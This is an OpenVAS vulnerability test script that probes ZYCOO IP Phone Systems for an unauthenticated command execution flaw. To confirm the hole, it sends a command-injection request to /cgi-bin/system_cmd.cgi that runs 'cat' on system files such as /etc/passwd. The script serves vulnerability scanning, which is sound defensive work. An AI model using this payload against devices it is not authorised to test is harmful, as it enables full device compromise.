###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zycoo_ip_phone_system_rce_vuln.nasl 11650 2018-09-27 10:32:13Z jschulte $
#
# ZYCOO IP Phone System Remote Code Execution Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:zycoo:ip_phone_system';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106214");
  script_version("$Revision: 11650 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-27 12:32:13 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-08-29 16:16:40 +0700 (Mon, 29 Aug 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ZYCOO IP Phone System Remote Code Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_zycoo_ip_phone_system_detect.nasl");
  script_mandatory_keys("zycoo_ipphonesystem/detected");

  script_tag(name:"summary", value:"ZYCOO IP Phone System is prone to a remote command execution vulnerability");

  script_tag(name:"insight", value:"The script /cgi-bin/system_cmd.cgi doesn't validate input which leads
  to remote command execution.");

  script_tag(name:"impact", value:"An unauthenticated attacker can execute arbitrary OS commands which may
  lead to a complete compromise of the device.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40269/");

  script_tag(name:"vuldetect", value:"Tries to retrieve /etc/passwd.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cgi-bin/system_cmd.cgi?cmd='cat%20/" + file + "'";

  if(http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
